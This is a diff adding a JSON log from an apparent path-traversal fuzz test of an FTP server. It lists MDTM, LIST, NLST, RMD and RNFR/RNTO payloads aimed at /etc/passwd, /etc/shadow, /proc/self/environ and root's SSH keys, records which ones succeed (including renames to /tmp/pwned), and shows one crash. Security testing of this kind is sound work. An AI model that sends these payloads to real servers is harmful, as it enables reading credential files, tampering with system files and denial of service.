+      "command": "MDTM ..%2f..%2f",
+      "response": "550 ..%2f..%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 268,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM %2e%2e/",
+      "response": "550 %2e%2e/: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 269,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM %2e%2e%2f",
+      "response": "550 %2e%2e%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 270,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ..\\",
+      "response": "550 ..\\: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 271,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ..\\..\\",
+      "response": "550 ..\\..\\: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 272,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ..%c0%af",
+      "response": "550 ..%c0%af: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 273,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ..%c1%9c",
+      "response": "550 ..%c1%9c: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 274,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ../../../etc/passwd\u0000.txt",
+      "response": "213 20260214012128\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 275,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ../../../etc/passwd%00.txt",
+      "response": "550 ../../../etc/passwd%00.txt: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 276,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ....//",
+      "response": "550 ....//: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 277,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ..../",
+      "response": "550 ..../: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 278,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM .../",
+      "response": "550 .../: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 279,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM /etc/passwd",
+      "response": "213 20260214012128\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 280,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM /etc/shadow",
+      "response": "213 20260214012128\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 281,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM /root",
+      "response": "550 /root: not a plain file\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 282,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM /proc/self/cmdline",
+      "response": "213 20260214012940\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 283,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM /proc/self/environ",
+      "response": "213 20260214012940\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 284,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ~root",
+      "response": "550 ~root: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 285,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ~root/",
+      "response": "550 ~root/: not a plain file\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 286,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ~root/.bashrc",
+      "response": "550 ~root/.bashrc: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 287,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM /home/ftptest/../../../etc/passwd",
+      "response": "213 20260214012128\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 288,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
+      "response": "213 20260214012128\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 289,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM /..",
+      "response": "550 /..: not a plain file\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 290,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM /../../etc/passwd",
+      "response": "213 20260214012128\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 291,
+      "category": "path_traversal_MDTM",
+      "command": "MDTM ../../../../../../../../../../etc/passwd",
+      "response": "213 20260214012128\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 292,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 293,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 294,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../../../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 295,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../../../../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 296,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../../../../../etc/passwd",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 297,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../../../../../etc/shadow",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 298,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../../../../../root/.ssh/authorized_keys",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 299,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../../../../../proc/self/environ",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 300,
+      "category": "path_traversal_LIST",
+      "command": "LIST ..%2f..%2f",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "CRASH"
+    },
+    {
+      "id": 301,
+      "category": "path_traversal_LIST",
+      "command": "LIST %2e%2e%2f",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 302,
+      "category": "path_traversal_LIST",
+      "command": "LIST ..\\",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 303,
+      "category": "path_traversal_LIST",
+      "command": "LIST ..\\..\\",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 304,
+      "category": "path_traversal_LIST",
+      "command": "LIST ..%c0%af",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 305,
+      "category": "path_traversal_NLST",
+      "command": "NLST ../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 306,
+      "category": "path_traversal_NLST",
+      "command": "NLST ../../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 307,
+      "category": "path_traversal_NLST",
+      "command": "NLST ../../../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 308,
+      "category": "path_traversal_NLST",
+      "command": "NLST ../../../../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 309,
+      "category": "path_traversal_NLST",
+      "command": "NLST ../../../../../etc/passwd",
+      "response": "450 ../../../../../etc/passwd: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 310,
+      "category": "path_traversal_NLST",
+      "command": "NLST ../../../../../etc/shadow",
+      "response": "450 ../../../../../etc/shadow: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 311,
+      "category": "path_traversal_NLST",
+      "command": "NLST ../../../../../root/.ssh/authorized_keys",
+      "response": "450 ../../../../../root/.ssh/authorized_keys: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 312,
+      "category": "path_traversal_NLST",
+      "command": "NLST ../../../../../proc/self/environ",
+      "response": "450 ../../../../../proc/self/environ: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 313,
+      "category": "path_traversal_NLST",
+      "command": "NLST ..%2f",
+      "response": "450 ..%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 314,
+      "category": "path_traversal_NLST",
+      "command": "NLST ..%2f..%2f",
+      "response": "450 ..%2f..%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 315,
+      "category": "path_traversal_NLST",
+      "command": "NLST %2e%2e/",
+      "response": "450 %2e%2e/: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 316,
+      "category": "path_traversal_NLST",
+      "command": "NLST %2e%2e%2f",
+      "response": "450 %2e%2e%2f: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 317,
+      "category": "path_traversal_NLST",
+      "command": "NLST ..\\",
+      "response": "450 ..\\: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 318,
+      "category": "path_traversal_NLST",
+      "command": "NLST ..\\..\\",
+      "response": "450 ..\\..\\: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 319,
+      "category": "path_traversal_NLST",
+      "command": "NLST ..%c0%af",
+      "response": "450 ..%c0%af: No such file or directory\r\n",
+      "notes": "",
+      "status": "OK"
+    }
+  ],
+  "crashes": [
+    {
+      "id": 300,
+      "category": "path_traversal_LIST",
+      "command": "LIST ..%2f..%2f",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "CRASH"
+    }
+  ],
+  "anomalies": [
+    {
+      "id": 1,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../",
+      "response": "250 CWD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 2,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../../",
+      "response": "250 CWD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 3,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../../../",
+      "response": "250 CWD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 4,
+      "category": "path_traversal_CWD",
+      "command": "CWD ../../../../",
+      "response": "250 CWD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 32,
+      "category": "path_traversal_CWD",
+      "command": "CWD /..",
+      "response": "250 CWD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 77,
+      "category": "path_traversal_RMD",
+      "command": "RMD ..%2f",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 78,
+      "category": "path_traversal_RMD",
+      "command": "RMD ..%2f..%2f",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 79,
+      "category": "path_traversal_RMD",
+      "command": "RMD %2e%2e/",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 80,
+      "category": "path_traversal_RMD",
+      "command": "RMD %2e%2e%2f",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 81,
+      "category": "path_traversal_RMD",
+      "command": "RMD ..\\",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 82,
+      "category": "path_traversal_RMD",
+      "command": "RMD ..\\..\\",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 83,
+      "category": "path_traversal_RMD",
+      "command": "RMD ..%c0%af",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 84,
+      "category": "path_traversal_RMD",
+      "command": "RMD ..%c1%9c",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 87,
+      "category": "path_traversal_RMD",
+      "command": "RMD ....//",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 89,
+      "category": "path_traversal_RMD",
+      "command": "RMD .../",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 95,
+      "category": "path_traversal_RMD",
+      "command": "RMD ~root",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 137,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 139,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 141,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 143,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../../",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 145,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../../../etc/passwd",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 146,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 147,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../../../etc/shadow",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 150,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../../../proc/self/environ",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 160,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../etc/passwd\u0000.txt",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 161,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 166,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /etc/passwd",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 167,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 168,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /etc/shadow",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 170,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /root",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 172,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /proc/self/cmdline",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 173,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 174,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /proc/self/environ",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 177,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ~root/",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 180,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /home/ftptest/../../../etc/passwd",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 181,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 182,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 183,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 184,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /..",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 186,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR /../../etc/passwd",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 187,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 188,
+      "category": "path_traversal_RNFR",
+      "command": "RNFR ../../../../../../../../../../etc/passwd",
+      "response": "350 File or directory exists, ready for destination name\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 189,
+      "category": "path_traversal_RNTO",
+      "command": "RNTO /tmp/pwned",
+      "response": "250 Rename successful\r\n",
+      "notes": "After RNFR traversal",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 292,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 293,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 294,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../../../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 295,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../../../../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 296,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../../../../../etc/passwd",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 297,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../../../../../etc/shadow",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 298,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../../../../../root/.ssh/authorized_keys",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 299,
+      "category": "path_traversal_LIST",
+      "command": "LIST ../../../../../proc/self/environ",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 301,
+      "category": "path_traversal_LIST",
+      "command": "LIST %2e%2e%2f",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 302,
+      "category": "path_traversal_LIST",
+      "command": "LIST ..\\",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 303,
+      "category": "path_traversal_LIST",
+      "command": "LIST ..\\..\\",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 304,
+      "category": "path_traversal_LIST",
+      "command": "LIST ..%c0%af",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 305,
+      "category": "path_traversal_NLST",
+      "command": "NLST ../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 306,
+      "category": "path_traversal_NLST",
+      "command": "NLST ../../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 307,
+      "category": "path_traversal_NLST",
+      "command": "NLST ../../../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    },
+    {
+      "id": 308,
+      "category": "path_traversal_NLST",
+      "command": "NLST ../../../../",
+      "response": "NO_RESPONSE",
+      "notes": "",
+      "status": "TIMEOUT"
+    }
+  ],
+  "total_tests": 319,
+  "total_crashes": 1,
+  "total_anomalies": 59,
+  "end_time": "2026-02-13T20:54:35.852672"
+}
